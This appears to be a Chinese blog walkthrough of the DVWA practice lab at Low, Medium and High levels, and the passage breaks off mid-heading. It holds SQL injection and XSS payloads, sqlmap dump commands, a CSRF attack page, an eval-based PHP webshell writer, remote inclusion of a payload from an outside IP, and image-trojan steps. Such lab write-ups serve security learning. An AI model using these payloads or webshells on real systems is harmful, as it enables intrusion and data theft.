    <content type="html"><![CDATA[<h1 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h1><h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>查看代码 发现存在sql注入<br><img src="https://img-blog.csdnimg.cn/20210118115849953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>$ query  = “SELECT * FROM ’users‘ WHERE user = ‘$ user’ AND password = ‘$pass’;”;<br>构造 <code>admin’ # </code> 上图选中代码变为<br>$ query  = “SELECT * FROM ’users‘ WHERE user = ’admin’ <del># ‘ AND password = ‘$pass’;”;</del><br>（#为注释符）</p><p>即变成账户为admin 密码为空 绕过登录<br><img src="https://img-blog.csdnimg.cn/20210118120743567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>还可以抓包burp里进行字典爆破</p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>利用管道符 命令执行漏洞<img src="https://img-blog.csdnimg.cn/20210118124150895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="命令管道符的补充："><a href="#命令管道符的补充：" class="headerlink" title="命令管道符的补充："></a>命令管道符的补充：</h2><blockquote><p>Windows系统支持的管道符如下：<br>| 直接执行后面的语句。<br>|| 如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。<br>&amp; 两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。<br>&amp;&amp; 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</p></blockquote><blockquote><p>Linux系统支持的管道符如下：<br>; 执行完前面的语句再执行后面的语句。<br>| 显示后面语句的执行结果。<br>|| 当前面的语句执行出错时，执行后面的语句。<br>&amp; 两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。<br>&amp;&amp; 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</p></blockquote><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。<img src="https://img-blog.csdnimg.cn/20210131211950245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>输入两次不一致的密码<br><img src="https://img-blog.csdnimg.cn/20210118124802606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">查看url栏发现这是个修改密码的链接(一定要查看链接所提交的内容)<br><img src="https://img-blog.csdnimg.cn/20210118125702960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">直接在url栏修改456为123<br><img src="https://img-blog.csdnimg.cn/20210118125803421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">得到password changed<br><img src="https://img-blog.csdnimg.cn/2021011813013135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_16,color_FFFFFF,t_70">再次打开DVWA时 发现登录密码错误 输入CSRF里改成的123成功登入</p><p>说明可以通过伪造url实现受害者点击跨站链接(或者写进网页文件里)修改其密码（123456）</p><blockquote><p><a href="http://localhost/DVWA(admin%20password)/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#">http://localhost/DVWA(admin%20password)/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a></p></blockquote><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p>点击几个文件发现url<code>http://localhost/DVWA/vulnerabilities/fi/?page=include.php</code><br>随便改一下：<code>http://localhost/DVWA/vulnerabilities/fi/?page=666.php</code><br><img src="https://img-blog.csdnimg.cn/20210207103351948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>存在文件包含漏洞 测试是否可以远程后(该安全等级下可以 不可以的话需要配合文件上传漏洞)<br>D盘下写一个1.txt：<br>(注意，我这儿的D盘路径与dvwa位置不在同一处，此处模拟了远程包含)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>fwrite(fopen(<span class="hljs-string">&quot;1.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&quot;&lt;?php @eval(<span class="hljs-subst">$_POST</span>[123]);?&gt;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://localhost/DVWA/vulnerabilities/fi/?page=D:/1.txt</code><br>远程包含刚刚的1.txt后，发现在<code>DVWA\vulnerabilities\fi</code>下出现我们设计好的一句话木马1.php，说明远程包含成功</p><p><img src="https://img-blog.csdnimg.cn/20210207104000956.png">实际远程包含长这样<code>localhost/DVWA/vulnerabilities/fi/?page=http://110.247.68.66/1.txt</code><br>连接蚁剑即可</p><h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><p>没有过滤上传格式  挂上一句话<br><img src="https://img-blog.csdnimg.cn/20210119114311338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">菜刀添加马的绝对路径和密码<br><img src="https://img-blog.csdnimg.cn/20210119114656435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210119114801547.png"><br>菜刀连接成功<br><img src="https://img-blog.csdnimg.cn/20210119115012575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h2><p>环境配置错误 待补充</p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>代码如下：<br>$ query  = “SELECT first_name, last_name FROM users WHERE user_id = ‘$id’;”; <strong>为数字型注入</strong></p><ul><li>手工注入：<br><code>’ or 1#</code><br><img src="https://img-blog.csdnimg.cn/20210123124222296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">查询数据库名称和版本：<br><code>1&#39; union select1,database()#</code></li></ul><p><img src="https://img-blog.csdnimg.cn/20210123125952659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">爆出账号密码：<br><code>1&#39; union select user,password from dvwa.users #</code><br><img src="https://img-blog.csdnimg.cn/20210123164921556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><strong>使用sqlmap自动注入：</strong><br>需要跟cookie参数！burp里抓一下或者F12→→Console→→document.cookie得到当前页面cookie</p><p>查询到当前用户和数据库：<br>（看起来后端DBMS是“mysql”。是否要跳过特定于其他DBMS的测试有效负载？直接跳过，不再扫描其他类型的数据库）</p><p><img src="https://img-blog.csdnimg.cn/20210123110126686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>查询当前用户（并且再查询了一次数据库）：<br><img src="https://img-blog.csdnimg.cn/2021012311045032.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>直接拖库：<br><img src="https://img-blog.csdnimg.cn/20210123110912656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">回答问题：</p><ul><li>是否要将哈希值存储到临时文件中，以便其他工具进行处理？n</li><li>你想通过基于字典的攻击破解它们吗？y</li><li>你想用什么字典？enter</li><li>是否要使用常用密码后缀？（慢）y<br><img src="https://img-blog.csdnimg.cn/20210123111032446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">爆出：<br><img src="https://img-blog.csdnimg.cn/20210123111120841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></li></ul><h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><p>与前者无异<br><img src="https://img-blog.csdnimg.cn/20210131205918392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><p><strong>反射型</strong><br><img src="https://img-blog.csdnimg.cn/2021013121264539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210131212539124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><code>&lt;script&gt;alert(&#39;hacked&#39;)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210131212822970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><strong>存储型</strong><br><img src="https://img-blog.csdnimg.cn/20210131215016201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><code>&lt;script&gt;alert(&#39;hacked&#39;)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210131215136514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h1><h2 id="Brute-Force-1"><a href="#Brute-Force-1" class="headerlink" title="Brute Force"></a>Brute Force</h2><p><img src="https://img-blog.csdnimg.cn/20210205202516581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>在上一等级加了一sleep(2) 只是增加了爆破的时间而已</p><h2 id="Command-Injection-1"><a href="#Command-Injection-1" class="headerlink" title="Command Injection"></a>Command Injection</h2><p><img src="https://img-blog.csdnimg.cn/20210205203149810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210205202934944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="CSRF-1"><a href="#CSRF-1" class="headerlink" title="CSRF"></a>CSRF</h2><p>过滤规则是http包头的Referer参数的值中必须包含主机名<br><img src="https://img-blog.csdnimg.cn/20210205222605401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>同上一等级将伪造url写进一个以主机名命名的网页文件即可伪造Referer绕过</p><h2 id="File-Inclusion-1"><a href="#File-Inclusion-1" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p>同样 测试可以远程包含后 直接写一个1.txt 然后本地包含 连接1.php<br>考了什么：</p><p><img src="https://img-blog.csdnimg.cn/20210207105524332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>代码即将<code>http:// ../ ..\</code>替换为空即删除 那么可以双写绕过：如<code>..././</code>过滤后变为<code>../</code></p><h2 id="File-Upload-1"><a href="#File-Upload-1" class="headerlink" title="File Upload"></a>File Upload</h2><p>文件上传的过滤分为两种:一是上传类型 二是后缀名<br>方法一：<br>抓包 改包<img src="https://img-blog.csdnimg.cn/20210207113713123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210207113609279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210207114247547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210207114026134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>方法二：<br>00截断参考<a href="https://blog.csdn.net/qq_36119192/article/details/82904642?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161266854316780261920310%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&request_id=161266854316780261920310&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-82904642.first_rank_v2_pc_rank_v29&utm_term=dvwa%20upload">谢公子的博客</a></p><p>上传完一句话后 蚁剑连接</p><h2 id="SQL-Injection-1"><a href="#SQL-Injection-1" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>换一个工具 超级sql注入(选择合适的工具 熟悉sql注入原理后 注意时效性 并且掌握注入工具的机制)<br>burp抓包 整个包放进注入中心<br><img src="https://img-blog.csdnimg.cn/20210207164641599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>点击自动识别后观察下面框内的程序运行状态<br>注入完后数据中心填入查询条数以及查出数据库 表 列</p><p><strong>回到sqlmap(yyds)</strong><br>由于medium的sql注入均为post注入（get注入在url有?id=1）<br>一般地，post有三个参数，得换个姿势：</p><p><strong>方法一：</strong><br>burp抓包，右击copy file为post.txt保存至sqlmap.py同一文件夹内<br>使用-r参数：<code>python3 sqlmap.py -r &quot;post.txt&quot; --batch</code>后面与前面的sqlmap使用无异<img src="https://img-blog.csdnimg.cn/20210210001416332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>特殊情况需要手动指定参数<a href="https://blog.csdn.net/u014549283/article/details/81290015?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">传送门</a><br><strong>方法二：</strong><br>让sqlmap自己找注入口：<br>使用:<code>python3 sqlmap.py -u &quot;url&quot; --form</code><br>后面更换参数与前面用法无异<br><code>python3 sqlmap.py -u &quot;url&quot; --form --current-db --batch</code>（加–batch参数可以不用回答问题 系统默认执行）<br><img src="https://img-blog.csdnimg.cn/20210210001742708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><strong>方法三：</strong><br>指定参数：<code>sqlmap -u http://xxx.xxx.com/Login.asp --data &quot;id=1&quot;</code></p><h2 id="SQL-Injection-Blind-1"><a href="#SQL-Injection-Blind-1" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><p>与上无异</p><h2 id="XSS-1"><a href="#XSS-1" class="headerlink" title="XSS"></a>XSS</h2><p><strong>反射型</strong><br><img src="https://img-blog.csdnimg.cn/20210209183447662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">双写绕过：<code>&lt;sc&lt;script&gt;ript&gt;alert(&#39;hacked&#39;)&lt;/script&gt;</code></p><p><strong>存储型</strong><br>同上</p><h1 id="High"><a href="#High" class="headerlink" title="High"></a>High</h1><h2 id="Command-Injection-2"><a href="#Command-Injection-2" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>过滤规则中 <code>&#39;| &#39;</code>多了一个空格 说明可以通过 | 绕过</p><h2 id="CSRF-2"><a href="#CSRF-2" class="headerlink" title="CSRF"></a>CSRF</h2><p>参考众多wp都提到一个同源策略 <a href="https://www.cnblogs.com/laixiangran/p/9064769.html">来了解一下</a><br>总结来说：同源是指域名、协议、端口相同。它是浏览器的最核心最基本的安全功能——它认为自任何站点装载的信赖内容是不安全的。当被浏览器半信半疑的脚本运行在沙箱时，它们应该<strong>只被允许访问来自同一站点的资源</strong>，而不是那些来自其它站点可能怀有恶意的资源。<br><img src="https://img-blog.csdnimg.cn/20210307181233902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">了解到这里即可<br>那么看看这题源码：<br><img src="https://img-blog.csdnimg.cn/2021030823044384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>可以看到，high级别加入了<code>Anti-CSRF token</code>机制：用户每一次访问修改密码的网页时，都会向服务器索要一次token(是服务器随机生成的，也是我们的目标)，当用户提交了密码修改，将token传回服务器，token正确才能更新数据库(改密)</p><p>注意到是以get方式请求的，token就会出现在地址栏传回服务器，那么思路就清晰了：我们要得到token，就必须要带有用户的cookie去访问修改密码的网页，然后截取服务器传回的token，然后带上token构造跨站请求伪造</p><p>下面是一个诱使用户点击的页面，其作用是：静默访问用户修改密码的页面(当然可以设置404回显)，获取到服务器传回的token，然后带上token和攻击url向服务器发送请求</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span><br><span class="javascript">        <span class="hljs-comment">//获取用户的token，并设置为表单中的token，然后提交修改密码的表单</span></span><br><span class="javascript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="javascript">        </span>&#123;</span><br><span class="javascript">            <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].value=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;hack&quot;</span>).contentWindow.document.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].value;</span><br><span class="javascript">            <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;transfer&quot;</span>).submit();</span><br><span class="javascript">        &#125;</span><br><span class="javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;attack()&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://dvwa.com/vulnerabilities/csrf/&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hack&quot;</span>  <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>&gt;</span>  <span class="hljs-comment">&lt;!--在该网页内打开另一个网页--&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;transfer&quot;</span>  <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://dvwa.com/vulnerabilities/csrf/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_new&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_conf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user_token&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Change&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Change&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然而，该网页应该是部署在自己推出的服务器上的，用户所在网页是<code>http://localhost/DVWA/vulnerabilities/csrf/</code>，至此，上述不符合同源策略，故攻击思路不成立</p><p>那究竟怎样才能拿到token呢，那就只能让服务器爆出token，利用xss<br><code>&lt;iframe src=&quot;../csrf/&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;&lt;/iframe&gt;</code>爆出token</p><p>（未成功）</p><h2 id="File-Inclusion-2"><a href="#File-Inclusion-2" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p><img src="https://img-blog.csdnimg.cn/20210308232241155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">这个级别要求page后面必须是file*或者include.php否则就报错<br>利用file协议打开本地文件，本地文件即在服务器下挂个一句话木马，那么则需要先配合文件上传，然后再包含连接蚁剑(可以文件上传了何必再包含 手动狗头) 其实不是，文件上传漏洞在high级别下已经不能友好的放*.php了<br>那么如何才能挂进一句话呢 看下一条</p><h2 id="File-Upload（图片马）"><a href="#File-Upload（图片马）" class="headerlink" title="File Upload（图片马）"></a>File Upload（图片马）</h2><p>先代码审计：<br><img src="https://img-blog.csdnimg.cn/20210309160727372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">首先，<code>basename()</code>函数返回路径中的文件名部分，<code>strrpos()</code>获取文件名中最后一个<code>.</code>后面的所有字符串(也就是获取后缀名的操作了)，<code>substr()</code>返回文件名中的后缀名(即strrpos截取到的内容) 以此期望过滤后缀名(jpg jpeg png通过)，然后再使用<code>getimagesize()</code>函数测定这是不是一张图片</p><blockquote><p>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</p></blockquote><p>那么以上操作基本不能绕过上传其他类型的文件了，下面介绍图片马的制作：<br>方法一：一个图片，一个一句话木马，使用cmd的copy拼接<code>copy 1.jpg/b + xiaoma.php/a attack.jpg</code>/a表示一个ASCII 文本文件 /b表示一个二进位文件<br>方法二：直接用记事本的方式打开图片，并且直接在乱码最后插入一句话代码即可。</p><h2 id="SQL-Injection-2"><a 